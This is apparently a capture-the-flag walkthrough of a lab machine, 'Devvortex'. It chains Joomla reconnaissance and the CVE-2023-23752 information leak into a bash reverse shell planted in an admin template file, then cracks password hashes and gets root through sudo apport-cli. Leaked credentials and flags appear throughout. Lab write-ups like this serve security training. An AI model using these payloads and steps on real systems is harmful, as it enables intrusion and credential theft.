# Reconnaissances
## Port Scan
`$ sudo nmap -p- -sC -T4 10.10.11.242`
```
Nmap scan report for 10.10.11.242
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://devvortex.htb/

Nmap done: 1 IP address (1 host up) scanned in 48.04 seconds

```

### Observe HTTP
`$ echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts`
`$ firefox devvortex.htb`
`$ gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 `
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Try the DNS BruteForce
`$ wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302`
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                                                                                                      

Total time: 30.16074
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 661.9863
```

Add to `/etc/hosts`
```
10.10.11.242 devvortex.htb dev.devvortex.htb
```

### Enumerate dev.devvortex.htb
`$ dirsearch -u http://dev.devvortex.htb/ -i 200`
```
Target: http://dev.devvortex.htb/

[06:06:48] Starting:                             
[06:07:50] 200 -   31B  - /administrator/cache/   
[06:07:50] 200 -   12KB - /administrator/      
[06:07:50] 200 -   31B  - /administrator/logs/     
[06:07:50] 200 -   12KB - /administrator/index.php
[06:08:15] 200 -   31B  - /cache/          
[06:08:21] 200 -   31B  - /cli/      
[06:08:24] 200 -   31B  - /components/    
[06:08:27] 200 -    0B  - /configuration.php        
[06:09:03] 200 -    7KB - /htaccess.txt   
[06:09:06] 200 -   31B  - /images/    
[06:09:07] 200 -   31B  - /includes/       
[06:09:17] 200 -   31B  - /layouts/    
[06:09:18] 200 -   31B  - /libraries/  
[06:09:18] 200 -   18KB - /LICENSE.txt  
[06:09:28] 200 -   31B  - /media/       
[06:09:35] 200 -   31B  - /modules/    
[06:09:57] 200 -   31B  - /plugins/  
[06:10:05] 200 -    5KB - /README.txt    
[06:10:09] 200 -  764B  - /robots.txt     
[06:10:34] 200 -   31B  - /templates/  
[06:10:34] 200 -   31B  - /templates/index.html  
[06:10:34] 200 -    0B  - /templates/system/      
[06:10:37] 200 -   31B  - /tmp/   
[06:10:52] 200 -    3KB - /web.config.txt                                   
Task Completed     
```

`$ firefox dev.devvortex.htb/robots.txt`
```
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

`$ curl http://dev.devvortex.htb/README.txt`
```
    * This is a Joomla! 4.x installation/upgrade package.
    * Joomla! Official site: https://www.joomla.org
    * Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
    * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
```

`$ searchsploit joomla 4.2`
```
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Joomla! Component com_civicrm 4.2.2 - Remote Code Injection                                                                               | php/webapps/24969.txt
Joomla! Component Google Map Landkarten 4.2.3 - SQL Injection                                                                             | php/webapps/44113.txt
Joomla! Component ionFiles 4.4.2 - File Disclosure                                                                                        | php/webapps/6809.txt
Joomla! Component jDownloads 1.0 - Arbitrary File Upload                                                                                  | php/webapps/17303.txt
Joomla! Component MaQma Helpdesk 4.2.7 - 'id' SQL Injection                                                                               | php/webapps/41399.txt
Joomla! Component mydyngallery 1.4.2 - SQL Injection                                                                                      | php/webapps/7343.txt
Joomla! com_hdwplayer 4.2 - 'search.php' SQL Injection                                                                                    | php/webapps/48242.txt
Joomla! v4.2.8 - Unauthenticated information disclosure                                                                                   | php/webapps/51334.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

`$ cat /usr/share/exploitdb/exploits/php/webapps/51334.py`
```
#!/usr/bin/env ruby

# Exploit
## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
## Author website: https://pwn.by/noraj/
## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
## Date: 2023-03-24
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml
```

# Pre-Exploitation
Download `CVE-2023-23752` exploit.
`$ git clone https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT.git`
`$ python3 CVE-2023-23752.py -u http://dev.devvortex.htb`
```
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Checking if target is vulnerable
[+] Target is vulnerable
[*] Launching exploit against: http://dev.devvortex.htb
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
[+] Target is vulnerable for usernames
[+] Gathering username(s) for: http://dev.devvortex.htb
[+] Username: lewis
[+] Username: logan
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for passwords at path: /api/index.php/v1/config/application?public=true
[+] Target is vulnerable for passwords
[+] Gathering password(s) for: http://dev.devvortex.htb
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
[+] Password: P4ntherg0t1n5r3c0n##
[~] No passwords found
[~] No passwords found
[~] No passwords found
[~] No passwords found
```

# Exploit
`$ firefox http://dev.devvortex.htb/administrator` (username:`lewis` & password:`P4ntherg0t1n5r3c0n##`)
`$ firefox "http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=222&file=L2xvZ2luLnBocA%3D%3D&isMedia=0"` (insert to the file `login.php`)
```
system("bash -c 'bash -i >& /dev/tcp/10.10.14.21/1337 0>&1');
```
or
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/1337 0>&1'");
```

**Listening port**
```
$ rlwrap nc -lnvp 1337  
listening on [any] 1337 ...
```

Then access the backdoor:
`$ firefox http://dev.devvortex.htb/administrator/templates/atum/login.php`
```
listening on [any] 1337 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.242] 50494
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@devvortex:~/dev.devvortex.htb/administrator$ pwd
/var/www/dev.devvortex.htb/administrator
```

## Lateral Movement
`$ mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##`
```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Database changed
mysql> select username,password from sd4fg_users;
select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

Try to Creack the password that stored on the DB
`$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:17 0.00% (ETA: 2024-03-21 05:39) 0g/s 17.63p/s 35.27c/s 35.27C/s volleyball..sweet
tequieromucho    (?)     
```

## SSH Connect
`$ ssh logan@devvortex.htb`
```
The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: tequieromucho
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 10 Mar 2024 11:53:13 AM UTC
```
```
logan@devvortex:~$ cat user.txt 
dbe32309644ab23709bb67d1c8761f5a
```

# Privilege Escalation
`logan@devvortex:~$ sudo -l`
```
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`$ sudo /usr/bin/apport-cli -f`
```
Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1
```
```
Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2
```
```
What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```
```
== ProcCpuinfoMinimal =================================
processor       : 1
vendor_id       : AuthenticAMD
cpu family      : 25
model           : 1
model name      : AMD EPYC 7313P 16-Core Processor
stepping        : 1
cpu MHz         : 2994.375
cache size      : 512 KB
physical id     : 2
siblings        : 1
core id         : 0
cpu cores       : 1
apicid          : 2
initial apicid  : 2
fpu             : yes
fpu_exception   : yes
cpuid level     : 16
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat pku ospke overflow_recov succor
bugs            : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass
bogomips        : 5988.75
TLB size        : 2560 4K pages
clflush size    : 64
!/bin/bash
```

Then
```
root@devvortex:/home/logan# cat /root/root.txt
5df084b761601558bd0078086a6718de
```